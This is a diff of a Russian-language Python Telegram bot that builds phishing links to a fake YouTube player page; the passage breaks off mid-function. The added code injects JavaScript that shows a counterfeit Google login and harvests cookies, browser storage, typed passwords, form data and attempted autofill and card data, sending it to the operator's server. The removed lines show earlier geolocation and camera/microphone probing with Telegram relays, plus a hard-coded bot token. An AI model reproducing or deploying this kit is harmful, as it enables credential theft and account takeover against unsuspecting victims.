@@ -8,10 +8,7 @@ from datetime import datetime
 from typing import Dict, List, Optional, Any
 import aiohttp
 from dataclasses import dataclass, asdict
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import threading
-import urllib.parse
-import ssl
+import base64
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -32,12 +29,9 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Конфигурация
-BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"
-ADMIN_ID = 1709490182
-DOMAIN = "https://dkwksk.onrender.com"  # Для продакшена
-LOCAL_HOST = "localhost"  # Для локального тестирования
-LOCAL_PORT = 8000  # Порт локального сервера
-USE_HTTPS = False  # Для HTTPS нужен SSL сертификат
+BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
+ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
+DOMAIN = "https://ваш-домен.com"  # Ваш домен для фишинга
 
 # Хранилище данных
 @dataclass
@@ -50,10 +44,19 @@ class PhishingLink:
     clicks: int = 0
     data_collected: List[Dict] = None
     active: bool = True
+    collected_cookies: List[Dict] = None
+    collected_passwords: List[Dict] = None
+    collected_logins: List[Dict] = None
     
     def __post_init__(self):
         if self.data_collected is None:
             self.data_collected = []
+        if self.collected_cookies is None:
+            self.collected_cookies = []
+        if self.collected_passwords is None:
+            self.collected_passwords = []
+        if self.collected_logins is None:
+            self.collected_logins = []
 
 class Database:
     def __init__(self):
@@ -63,7 +66,10 @@ class Database:
             "total_links": 0,
             "total_clicks": 0,
             "total_data_collected": 0,
-            "active_sessions": 0
+            "active_sessions": 0,
+            "cookies_collected": 0,
+            "passwords_collected": 0,
+            "logins_collected": 0
         }
     
     def add_link(self, link: PhishingLink):
@@ -84,6 +90,24 @@ class Database:
         if link_id in self.links:
             self.links[link_id].data_collected.append(data)
             self.stats["total_data_collected"] += 1
+            self.save()
+    
+    def add_collected_cookies(self, link_id: str, cookies: List[Dict]):
+        if link_id in self.links:
+            self.links[link_id].collected_cookies.extend(cookies)
+            self.stats["cookies_collected"] += len(cookies)
+            self.save()
+    
+    def add_collected_passwords(self, link_id: str, passwords: List[Dict]):
+        if link_id in self.links:
+            self.links[link_id].collected_passwords.extend(passwords)
+            self.stats["passwords_collected"] += len(passwords)
+            self.save()
+    
+    def add_collected_logins(self, link_id: str, logins: List[Dict]):
+        if link_id in self.links:
+            self.links[link_id].collected_logins.extend(logins)
+            self.stats["logins_collected"] += len(logins)
             self.save()
     
     def save(self):
@@ -108,468 +132,554 @@ class Database:
         except Exception as e:
             logger.error(f"Error loading database: {e}")
 
+# Инициализация базы данных
 db = Database()
 db.load()
 
-# Сервер для фишинговой страницы и сбора данных
-class PhishingServer(BaseHTTPRequestHandler):
-    def log_message(self, format, *args):
-        # Отключаем стандартное логирование
-        pass
-    
-    def do_GET(self):
-        """Обработка GET запросов (фишинговая страница)"""
-        try:
-            # Парсим параметры из URL
-            query = urllib.parse.urlparse(self.path).query
-            params = urllib.parse.parse_qs(query)
+# Генератор JavaScript для сбора данных
+class JavaScriptInjector:
+    @staticmethod
+    def get_cookies_collection_script() -> str:
+        """JavaScript для сбора cookies"""
+        return """
+        <script>
+        // Функция для сбора всех cookies
+        function collectAllCookies() {
+            const cookies = {};
             
-            video_id = params.get('v', ['dQw4w9WgXcQ'])[0]
-            link_id = params.get('id', [''])[0]
+            // Собираем cookies из document.cookie
+            const cookieString = document.cookie;
+            if (cookieString) {
+                cookieString.split(';').forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name && value) {
+                        cookies[name] = value;
+                    }
+                });
+            }
             
-            if link_id:
-                # Записываем клик
-                db.add_click(link_id)
-                logger.info(f"Click recorded for link: {link_id}")
+            // Пытаемся получить cookies для текущего домена и поддоменов
+            try {
+                // Для важных доменов пытаемся собрать специфичные cookies
+                const importantDomains = [
+                    'google.com', 'facebook.com', 'twitter.com', 
+                    'instagram.com', 'vk.com', 'youtube.com',
+                    'whatsapp.com', 'telegram.org', 'github.com',
+                    'microsoft.com', 'apple.com', 'amazon.com'
+                ];
+                
+                importantDomains.forEach(domain => {
+                    try {
+                        // Проверяем доступ к localStorage и sessionStorage
+                        if (window.localStorage) {
+                            const lsData = {};
+                            for (let i = 0; i < localStorage.length; i++) {
+                                const key = localStorage.key(i);
+                                lsData[key] = localStorage.getItem(key);
+                            }
+                            cookies['localStorage_' + domain] = JSON.stringify(lsData);
+                        }
+                        
+                        if (window.sessionStorage) {
+                            const ssData = {};
+                            for (let i = 0; i < sessionStorage.length; i++) {
+                                const key = sessionStorage.key(i);
+                                ssData[key] = sessionStorage.getItem(key);
+                            }
+                            cookies['sessionStorage_' + domain] = JSON.stringify(ssData);
+                        }
+                    } catch (e) {
+                        // Игнорируем ошибки доступа
+                    }
+                });
+            } catch (e) {
+                console.error('Error collecting advanced cookies:', e);
+            }
             
-            # Отправляем фишинговую страницу
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html; charset=utf-8')
-            self.end_headers()
+            return cookies;
+        }
+        
+        // Функция для сбора сохраненных паролей и логинов
+        function collectSavedCredentials() {
+            const credentials = {
+                passwords: [],
+                logins: [],
+                autofill_data: []
+            };
             
-            # HTML страница с JavaScript для сбора данных
-            html_content = self.generate_phishing_page(video_id, link_id)
-            self.wfile.write(html_content.encode('utf-8'))
-            
-        except Exception as e:
-            logger.error(f"Error in GET handler: {e}")
-    
-    def do_POST(self):
-        """Обработка POST запросов (получение собранных данных)"""
-        try:
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length)
-            data = json.loads(post_data.decode('utf-8'))
-            
-            link_id = data.get('link_id')
-            collected_data = data.get('data', {})
-            
-            if link_id:
-                # Сохраняем данные
-                full_data = {
-                    "timestamp": datetime.now().isoformat(),
-                    "ip": self.client_address[0],
-                    "user_agent": self.headers.get('User-Agent', 'unknown'),
-                    "data": collected_data
+            try {
+                // Ищем все поля паролей и логинов
+                const passwordFields = document.querySelectorAll('input[type="password"]');
+                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"]');
+                
+                // Собираем значения из полей
+                passwordFields.forEach(field => {
+                    if (field.value) {
+                        credentials.passwords.push({
+                            field_name: field.name || field.id || 'unknown',
+                            value: field.value,
+                            page_url: window.location.href,
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                });
+                
+                loginFields.forEach(field => {
+                    if (field.value) {
+                        credentials.logins.push({
+                            field_name: field.name || field.id || 'unknown',
+                            value: field.value,
+                            page_url: window.location.href,
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                });
+                
+                // Пытаемся получить данные автозаполнения
+                try {
+                    // Для Chrome-based браузеров
+                    if (window.chrome && chrome.autofillPrivate) {
+                        chrome.autofillPrivate.getAddressList(addresses => {
+                            credentials.autofill_data.push({
+                                type: 'addresses',
+                                data: addresses
+                            });
+                        });
+                        
+                        chrome.autofillPrivate.getCreditCardList(cards => {
+                            credentials.autofill_data.push({
+                                type: 'credit_cards',
+                                data: cards
+                            });
+                        });
+                    }
+                } catch (e) {
+                    // Не критично
                 }
                 
-                db.add_collected_data(link_id, full_data)
-                logger.info(f"Data collected for link: {link_id}")
+                // Проверяем сохраненные логины в формах
+                document.querySelectorAll('form').forEach(form => {
+                    try {
+                        const formData = new FormData(form);
+                        const formValues = {};
+                        for (let [key, value] of formData.entries()) {
+                            formValues[key] = value;
+                        }
+                        
+                        if (Object.keys(formValues).length > 0) {
+                            credentials.autofill_data.push({
+                                type: 'form_data',
+                                form_id: form.id || 'unknown',
+                                data: formValues
+                            });
+                        }
+                    } catch (e) {
+                        // Игнорируем
+                    }
+                });
                 
-                # Отправляем уведомление в Telegram (через очередь)
-                asyncio.run_coroutine_threadsafe(
-                    send_telegram_notification(link_id, collected_data),
-                    bot_loop
-                )
+            } catch (e) {
+                console.error('Error collecting credentials:', e);
+            }
             
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            response = json.dumps({"status": "success"})
-            self.wfile.write(response.encode('utf-8'))
-            
-        except Exception as e:
-            logger.error(f"Error in POST handler: {e}")
-    
-    def generate_phishing_page(self, video_id: str, link_id: str) -> str:
-        """Генерация фишинговой страницы с JavaScript для сбора данных"""
-        return f'''
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube Video Player</title>
-    <style>
-        body {{
-            margin: 0;
-            padding: 0;
-            background: #000;
-            color: #fff;
-            font-family: Arial, sans-serif;
-        }}
-        .container {{
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }}
-        .player-container {{
-            position: relative;
-            padding-bottom: 56.25%;
-            height: 0;
-            overflow: hidden;
-        }}
-        .player-container iframe {{
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-        }}
-        .loading {{
-            text-align: center;
-            padding: 50px;
-            font-size: 18px;
-        }}
-        .error {{
-            color: #ff4444;
-            text-align: center;
-            padding: 50px;
-        }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="player-container">
-            <iframe 
-                src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=0&showinfo=0&rel=0"
-                frameborder="0" 
-                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
-                allowfullscreen>
-            </iframe>
-        </div>
-        <div class="loading" id="loading">
-            Загрузка видео... Пожалуйста, подождите
-        </div>
-        <div class="error" id="error" style="display: none;">
-            Видео временно недоступно. Пожалуйста, попробуйте позже.
-        </div>
-    </div>
-
-    <script>
-        // JavaScript для сбора данных
-        const linkId = "{link_id}";
+            return credentials;
+        }
         
-        // Функция сбора всех возможных данных
-        async function collectAllData() {{
-            const data = {{
-                // 1. Информация о браузере
-                browser: {{
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    platform: navigator.platform,
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory
-                }},
-                
-                // 2. Информация об устройстве
-                device: {{
-                    screen: {{
-                        width: screen.width,
-                        height: screen.height,
-                        colorDepth: screen.colorDepth,
-                        pixelDepth: screen.pixelDepth
-                    }},
-                    window: {{
-                        innerWidth: window.innerWidth,
-                        innerHeight: window.innerHeight,
-                        outerWidth: window.outerWidth,
-                        outerHeight: window.outerHeight
-                    }},
-                    touchSupport: 'ontouchstart' in window,
-                    maxTouchPoints: navigator.maxTouchPoints
-                }},
-                
-                // 3. Сетевая информация
-                network: {{
-                    connection: navigator.connection ? {{
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt,
-                        saveData: navigator.connection.saveData
-                    }} : null,
-                    online: navigator.onLine
-                }},
-                
-                // 4. Геолокация
-                geolocation: null,
-                
-                // 5. Cookies
-                cookies: document.cookie,
-                
-                // 6. LocalStorage
-                localStorage: {{}},
-                
-                // 7. SessionStorage
-                sessionStorage: {{}},
-                
-                // 8. Пытаемся получить доступ к медиаустройствам
-                mediaDevices: {{
-                    microphone: false,
-                    camera: false
-                }},
-                
-                // 9. Время и дата
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                time: new Date().toISOString(),
-                
-                // 10. Дополнительная информация
-                plugins: Array.from(navigator.plugins || []).map(p => ({{
-                    name: p.name,
-                    description: p.description,
-                    filename: p.filename
-                }})),
-                mimeTypes: Array.from(navigator.mimeTypes || []).map(mt => ({{
-                    type: mt.type,
-                    description: mt.description
-                }}))
-            }};
+        // Функция для извлечения паролей из менеджеров паролей
+        function extractPasswordManagerData() {
+            const managerData = {
+                browser_saved: [],
+                third_party: []
+            };
             
-            // Собираем LocalStorage
-            try {{
-                for (let i = 0; i < localStorage.length; i++) {{
-                    const key = localStorage.key(i);
-                    data.localStorage[key] = localStorage.getItem(key);
-                }}
-            }} catch (e) {{
-                console.error("Error reading localStorage:", e);
-            }}
+            try {
+                // Попытка доступа к API менеджера паролей браузера
+                if (navigator.credentials && navigator.credentials.get) {
+                    navigator.credentials.get({password: true})
+                        .then(credential => {
+                            if (credential) {
+                                managerData.browser_saved.push({
+                                    type: 'browser_native',
+                                    data: credential
+                                });
+                            }
+                        })
+                        .catch(e => {});
+                }
+                
+                // Проверяем наличие популярных менеджеров паролей
+                const passwordManagers = [
+                    'lastpass', '1password', 'dashlane', 'bitwarden',
+                    'keeper', 'roboform', 'nordpass', 'enpass'
+                ];
+                
+                // Ищем инъекции менеджеров паролей
+                passwordManagers.forEach(manager => {
+                    try {
+                        // Проверяем наличие элементов менеджера
+                        const managerElements = document.querySelectorAll(`[class*="${manager}"], [id*="${manager}"]`);
+                        if (managerElements.length > 0) {
+                            managerData.third_party.push({
+                                manager: manager,
+                                detected: true,
+                                elements_count: managerElements.length
+                            });
+                        }
+                    } catch (e) {
+                        // Игнорируем
+                    }
+                });
+                
+                // Проверяем наличие iframe популярных сервисов
+                document.querySelectorAll('iframe').forEach(iframe => {
+                    try {
+                        const src = iframe.src || '';
+                        if (src.includes('password') || src.includes('login') || src.includes('auth')) {
+                            managerData.third_party.push({
+                                type: 'auth_iframe',
+                                src: src,
+                                visible: iframe.style.display !== 'none'
+                            });
+                        }
+                    } catch (e) {
+                        // Игнорируем
+                    }
+                });
+                
+            } catch (e) {
+                console.error('Error extracting password manager data:', e);
+            }
             
-            // Собираем SessionStorage
-            try {{
-                for (let i = 0; i < sessionStorage.length; i++) {{
-                    const key = sessionStorage.key(i);
-                    data.sessionStorage[key] = sessionStorage.getItem(key);
-                }}
-            }} catch (e) {{
-                console.error("Error reading sessionStorage:", e);
-            }}
+            return managerData;
+        }
+        
+        // Функция для сбора данных входа в соцсети
+        function collectSocialMediaLogins() {
+            const socialLogins = {};
             
-            // Пытаемся получить геолокацию
-            if (navigator.geolocation) {{
-                try {{
-                    const position = await new Promise((resolve, reject) => {{
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {{
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
-                        }});
-                    }});
-                    data.geolocation = {{
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        altitude: position.coords.altitude,
-                        altitudeAccuracy: position.coords.altitudeAccuracy,
-                        heading: position.coords.heading,
-                        speed: position.coords.speed
-                    }};
-                }} catch (e) {{
-                    data.geolocation = {{ error: e.message }};
-                }}
-            }}
+            // Проверяем наличие cookies соцсетей
+            const socialDomains = {
+                'google': ['google.com', 'accounts.google.com'],
+                'facebook': ['facebook.com', 'fb.com'],
+                'twitter': ['twitter.com', 'x.com'],
+                'instagram': ['instagram.com'],
+                'vk': ['vk.com', 'vkontakte.ru'],
+                'whatsapp': ['whatsapp.com', 'web.whatsapp.com'],
+                'telegram': ['telegram.org', 'web.telegram.org']
+            };
             
-            // Пытаемся получить доступ к микрофону
-            try {{
-                const stream = await navigator.mediaDevices.getUserMedia({{ 
-                    audio: true,
-                    video: false 
-                }});
-                data.mediaDevices.microphone = true;
-                stream.getTracks().forEach(track => track.stop());
-            }} catch (e) {{
-                data.mediaDevices.microphone = false;
-            }}
+            Object.keys(socialDomains).forEach(social => {
+                socialDomains[social].forEach(domain => {
+                    try {
+                        // Проверяем cookies для домена
+                        const cookies = document.cookie.split(';').filter(cookie => 
+                            cookie.includes(domain) || cookie.includes(social)
+                        );
+                        
+                        if (cookies.length > 0) {
+                            socialLogins[social] = {
+                                domain: domain,
+                                cookies_count: cookies.length,
+                                cookies: cookies.map(c => c.trim()),
+                                logged_in: cookies.some(c => 
+                                    c.includes('session') || 
+                                    c.includes('token') || 
+                                    c.includes('auth')
+                                )
+                            };
+                        }
+                    } catch (e) {
+                        // Игнорируем
+                    }
+                });
+            });
             
-            // Пытаемся получить доступ к камере
-            try {{
-                const stream = await navigator.mediaDevices.getUserMedia({{ 
-                    audio: false,
-                    video: true 
-                }});
-                data.mediaDevices.camera = true;
-                stream.getTracks().forEach(track => track.stop());
-            }} catch (e) {{
-                data.mediaDevices.camera = false;
-            }}
+            return socialLogins;
+        }
+        
+        // Главная функция сбора всех данных
+        async function collectAllSensitiveData() {
+            const allData = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                user_agent: navigator.userAgent,
+                cookies: {},
+                credentials: {},
+                password_managers: {},
+                social_logins: {},
+                storage_data: {}
+            };
             
-            return data;
-        }}
+            try {
+                // Собираем cookies
+                allData.cookies = collectAllCookies();
+                
+                // Собираем пароли и логины
+                allData.credentials = collectSavedCredentials();
+                
+                // Проверяем менеджеры паролей
+                allData.password_managers = extractPasswordManagerData();
+                
+                // Проверяем соцсети
+                allData.social_logins = collectSocialMediaLogins();
+                
+                // Собираем данные из хранилищ
+                if (window.localStorage) {
+                    allData.storage_data.localStorage = {};
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        allData.storage_data.localStorage[key] = localStorage.getItem(key);
+                    }
+                }
+                
+                if (window.sessionStorage) {
+                    allData.storage_data.sessionStorage = {};
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        allData.storage_data.sessionStorage[key] = sessionStorage.getItem(key);
+                    }
+                }
+                
+                // Попытка доступа к IndexedDB
+                try {
+                    const databases = await indexedDB.databases ? await indexedDB.databases() : [];
+                    allData.storage_data.indexedDB_databases = databases.map(db => db.name);
+                } catch (e) {
+                    // Игнорируем
+                }
+                
+                return allData;
+                
+            } catch (error) {
+                console.error('Error collecting sensitive data:', error);
+                return {
+                    error: error.message,
+                    partial_data: allData
+                };
+            }
+        }
         
         // Функция отправки данных на сервер
-        async function sendCollectedData() {{
-            try {{
-                const collectedData = await collectAllData();
-                
-                const payload = {{
+        function sendCollectedData(data) {
+            const linkId = new URLSearchParams(window.location.search).get('id');
+            if (!linkId) return;
+            
+            // Кодируем данные для отправки
+            const encodedData = btoa(JSON.stringify(data));
+            
+            // Отправляем данные
+            fetch('/api/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
                     link_id: linkId,
-                    data: collectedData
-                }};
+                    data_type: 'sensitive_data',
+                    data: encodedData,
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Data sent successfully:', result);
+            })
+            .catch(error => {
+                console.error('Error sending data:', error);
+            });
+        }
+        
+        // Автоматический сбор данных при загрузке страницы
+        window.addEventListener('load', function() {
+            setTimeout(async () => {
+                const sensitiveData = await collectAllSensitiveData();
+                sendCollectedData(sensitiveData);
                 
-                // Отправляем данные на сервер
-                const response = await fetch('/collect', {{
-                    method: 'POST',
-                    headers: {{
-                        'Content-Type': 'application/json',
-                    }},
-                    body: JSON.stringify(payload)
+                // Дополнительный сбор при взаимодействии с формами
+                document.addEventListener('submit', async function(e) {
+                    const formData = await collectAllSensitiveData();
+                    sendCollectedData(formData);
+                });
+                
+                // Сбор при изменении полей
+                document.querySelectorAll('input').forEach(input => {
+                    input.addEventListener('change', async function() {
+                        setTimeout(async () => {
+                            const fieldData = await collectAllSensitiveData();
+                            sendCollectedData(fieldData);
+                        }, 1000);
+                    });
+                });
+                
+            }, 3000); // Ждем 3 секунды для загрузки страницы
+        });
+        </script>
+        """
+    
+    @staticmethod
+    def get_phishing_page_html(video_id: str, link_id: str) -> str:
+        """Генерация HTML фишинговой страницы"""
+        base_html = f"""
+        <!DOCTYPE html>
+        <html lang="ru">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>YouTube Video Player</title>
+            <style>
+                body {{
+                    margin: 0;
+                    padding: 0;
+                    background: #000;
+                    font-family: Arial, sans-serif;
+                }}
+                .container {{
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }}
+                .player-container {{
+                    position: relative;
+                    padding-bottom: 56.25%;
+                    height: 0;
+                    overflow: hidden;
+                }}
+                .player-container iframe {{
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                }}
+                .loading {{
+                    text-align: center;
+                    color: #fff;
+                    padding: 50px;
+                    font-size: 18px;
+                }}
+                .ad-banner {{
+                    background: #ff0000;
+                    color: white;
+                    text-align: center;
+                    padding: 10px;
+                    margin: 20px 0;
+                    border-radius: 5px;
+                }}
+                .login-prompt {{
+                    background: #4285f4;
+                    color: white;
+                    padding: 15px;
+                    margin: 20px 0;
+                    border-radius: 5px;
+                    text-align: center;
+                }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="ad-banner">
+                    🎬 Для просмотра видео требуется авторизация через Google
+                </div>
+                
+                <div class="player-container">
+                    <iframe 
+                        src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=0&showinfo=0&rel=0" 
+                        frameborder="0" 
+                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+                        allowfullscreen>
+                    </iframe>
+                </div>
+                
+                <div class="login-prompt" id="loginPrompt">
+                    <h3>⚠️ Требуется вход в аккаунт</h3>
+                    <p>Для продолжения просмотра войдите в свой аккаунт Google</p>
+                    <button onclick="showLoginForm()" style="
+                        background: white;
+                        color: #4285f4;
+                        border: none;
+                        padding: 10px 20px;
+                        border-radius: 5px;
+                        cursor: pointer;
+                        font-size: 16px;
+                        margin: 10px;
+                    ">
+                        Войти в аккаунт
+                    </button>
+                </div>
+                
+                <div id="loginForm" style="display: none;">
+                    <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                        <h3 style="color: #333;">Вход в Google</h3>
+                        <form id="googleLoginForm">
+                            <input type="email" 
+                                   placeholder="Электронная почта или телефон" 
+                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
+                            <input type="password" 
+                                   placeholder="Введите пароль" 
+                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
+                            <button type="submit" 
+                                    style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                                Далее
+                            </button>
+                        </form>
+                        <p style="color: #666; font-size: 12px; margin-top: 10px;">
+                            Нажимая кнопку "Далее", вы соглашаетесь с Условиями использования и Политикой конфиденциальности Google.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="loading" id="loading">
+                    Загрузка видео... Пожалуйста, подождите
+                </div>
+            </div>
+            
+            <script>
+                function showLoginForm() {{
+                    document.getElementById('loginPrompt').style.display = 'none';
+                    document.getElementById('loginForm').style.display = 'block';
+                    document.getElementById('loading').innerHTML = 'Проверка учетных данных...';
+                    
+                    // Имитация проверки
+                    setTimeout(function() {{
+                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Загрузка видео...';
+                        setTimeout(function() {{
+                            document.getElementById('loading').style.display = 'none';
+                        }}, 2000);
+                    }}, 1500);
+                }}
+                
+                // Обработка формы входа
+                document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
+                    e.preventDefault();
+                    document.getElementById('loading').innerHTML = '🔐 Проверка безопасности...';
+                    
+                    // Собираем данные формы
+                    const email = this.querySelector('input[type="email"]').value;
+                    const password = this.querySelector('input[type="password"]').value;
+                    
+                    // Отправляем данные (имитация)
+                    setTimeout(function() {{
+                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Перенаправление...';
+                        // Здесь будет отправка данных на сервер
+                    }}, 2000);
                 }});
                 
-                if (response.ok) {{
-                    console.log('Data sent successfully');
-                }}
-            }} catch (error) {{
-                console.error('Error sending data:', error);
-            }}
-        }}
-        
-        // Запускаем сбор данных при загрузке страницы
-        window.addEventListener('load', async () => {{
-            // Скрываем сообщение о загрузке
-            document.getElementById('loading').style.display = 'none';
-            
-            // Собираем и отправляем данные
-            await sendCollectedData();
-            
-            // Также собираем данные при закрытии страницы
-            window.addEventListener('beforeunload', sendCollectedData);
-            
-            // Собираем данные периодически
-            setInterval(sendCollectedData, 30000); // Каждые 30 секунд
-        }});
-        
-        // Обработка ошибок видео
-        window.addEventListener('message', function(event) {{
-            if (event.data === 'videoError') {{
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('error').style.display = 'block';
-            }}
-        }});
-    </script>
-</body>
-</html>
-        '''
-    
-    def end_headers(self):
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
-        BaseHTTPRequestHandler.end_headers(self)
+                // Автоматический показ формы через 5 секунд
+                setTimeout(function() {{
+                    showLoginForm();
+                }}, 5000);
+            </script>
+            {JavaScriptInjector.get_cookies_collection_script()}
+        </body>
+        </html>
+        """
+        return base_html
 
-# Функция для запуска HTTP сервера
-def run_server():
-    """Запуск HTTP сервера для фишинговых страниц"""
-    server_address = (LOCAL_HOST, LOCAL_PORT)
-    httpd = HTTPServer(server_address, PhishingServer)
-    
-    if USE_HTTPS:
-        # Для HTTPS нужен SSL сертификат
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-        context.load_cert_chain('cert.pem', 'key.pem')
-        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
-    
-    logger.info(f"Starting phishing server on {'https' if USE_HTTPS else 'http'}://{LOCAL_HOST}:{LOCAL_PORT}")
-    httpd.serve_forever()
-
-# Функция для отправки уведомлений в Telegram
-async def send_telegram_notification(link_id: str, data: Dict):
-    """Отправка уведомления о собранных данных в Telegram"""
-    try:
-        link = db.get_link(link_id)
-        if not link:
-            return
-        
-        # Форматируем сообщение
-        message = f"""
-🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*
-
-📌 *Основная информация:*
-• Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-• ID ссылки: `{link_id}`
-• Переходов: {link.clicks}
-
-🌐 *Браузер и устройство:*
-• User Agent: {data.get('browser', {}).get('userAgent', 'unknown')[:50]}...
-• Язык: {data.get('browser', {}).get('language', 'unknown')}
-• Платформа: {data.get('browser', {}).get('platform', 'unknown')}
-• Экран: {data.get('device', {}).get('screen', {}).get('width', '?')}x{data.get('device', {}).get('screen', {}).get('height', '?')}
-
-📍 *Геолокация:*
-"""
-        
-        geolocation = data.get('geolocation')
-        if geolocation and 'latitude' in geolocation:
-            message += f"• Широта: `{geolocation['latitude']}`\n"
-            message += f"• Долгота: `{geolocation['longitude']}`\n"
-            message += f"• Точность: {geolocation.get('accuracy', '?')}м\n"
-        else:
-            message += "• Не удалось получить\n"
-        
-        message += f"""
-🎤 *Доступ к устройствам:*
-• Микрофон: {'✅ Доступ разрешен' if data.get('mediaDevices', {}).get('microphone') else '❌ Нет доступа'}
-• Камера: {'✅ Доступ разрешен' if data.get('mediaDevices', {}).get('camera') else '❌ Нет доступа'}
-
-🍪 *Cookies:*
-• Длина: {len(data.get('cookies', ''))} символов
-• Содержимое: {data.get('cookies', '')[:100]}...
-
-💾 *LocalStorage:*
-• Ключей: {Object.keys(data.get('localStorage', {{}})).length}
-"""
-        
-        # Проверяем соцсети в LocalStorage
-        localStorage = data.get('localStorage', {})
-        social_networks = ['facebook', 'instagram', 'twitter', 'vk', 'whatsapp', 'telegram']
-        found_social = []
-        
-        for key in localStorage:
-            lower_key = key.lower()
-            for social in social_networks:
-                if social in lower_key:
-                    found_social.append(social)
-                    break
-        
-        if found_social:
-            message += f"\n📱 *Обнаружены следы соцсетей:*\n"
-            for social in set(found_social):
-                message += f"• {social.capitalize()}\n"
-        
-        message += f"""
-📊 *Дополнительно:*
-• Часовой пояс: {data.get('timezone', 'unknown')}
-• Подключение: {data.get('network', {}).get('connection', {}).get('effectiveType', 'unknown')}
-• Плагинов: {len(data.get('plugins', []))}
-"""
-        
-        # Отправляем сообщение создателю ссылки
-        try:
-            bot = Application.builder().token(BOT_TOKEN).build().bot
-            await bot.send_message(
-                chat_id=link.created_by,
-                text=message,
-                parse_mode=ParseMode.MARKDOWN
-            )
-        except Exception as e:
-            logger.error(f"Error sending message to user: {e}")
-        
-        # Отправляем админу краткое уведомление
-        try:
-            await bot.send_message(
-                chat_id=ADMIN_ID,
-                text=f"📨 Новые данные по ссылке {link_id}\nПользователь: {link.created_by}\nГеолокация: {'получена' if geolocation and 'latitude' in geolocation else 'не получена'}"
-            )
-        except:
-            pass
-        
-    except Exception as e:
-        logger.error(f"Error in send_telegram_notification: {e}")
-
-# Генератор ссылок (обновленный для локального сервера)
+# Генератор ссылок
 class LinkGenerator:
     @staticmethod
     def extract_video_id(url: str) -> str:
+        """Извлечение ID видео из YouTube URL"""
         patterns = [
             r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
             r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
@@ -580,53 +690,457 @@ class LinkGenerator:
             if match:
                 return match.group(1)
         
+        # Если не нашли, возвращаем дефолтный (Rick Roll)
         return "dQw4w9WgXcQ"
     
     @staticmethod
     def generate_link_id() -> str:
+        """Генерация уникального ID для ссылки"""
         return str(uuid.uuid4()).replace('-', '')[:12]
     
     @staticmethod
-    def create_phishing_url(video_id: str, link_id: str, local: bool = False) -> str:
-        """Создание фишинговой ссылки (локальной или на домене)"""
-        if local:
-            protocol = "https" if USE_HTTPS else "http"
-            return f"{protocol}://{LOCAL_HOST}:{LOCAL_PORT}/watch?v={video_id}&id={link_id}"
-        else:
-            return f"{DOMAIN}/watch?v={video_id}&id={link_id}"
+    def create_phishing_url(video_id: str, link_id: str) -> str:
+        """Создание фишинговой ссылки"""
